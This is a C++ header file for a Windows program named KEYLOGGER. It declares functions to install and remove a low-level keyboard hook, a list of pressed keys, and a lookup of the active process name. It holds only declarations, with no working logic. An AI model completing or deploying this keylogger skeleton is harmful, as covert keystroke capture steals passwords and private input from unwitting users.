
#ifndef KEYLOGGER
#define KEYLOGGER
#include <Windows.h>
#include <string>
#include <filesystem>
#include <Psapi.h>
#include <iostream>


// Did a namespace to keep things modular because we will be making a plethora of hooks in this program
namespace KL {


	inline extern bool set_hook();
	inline extern bool remove_hook();

	inline extern std::vector<char> pressed_keys;

	inline extern std::string get_active_process_name();

	inline extern LRESULT CALLBACK keyboard_proc(int n_code, WPARAM w_param, LPARAM l_param);

	inline extern HHOOK g_hook;
}



#endif 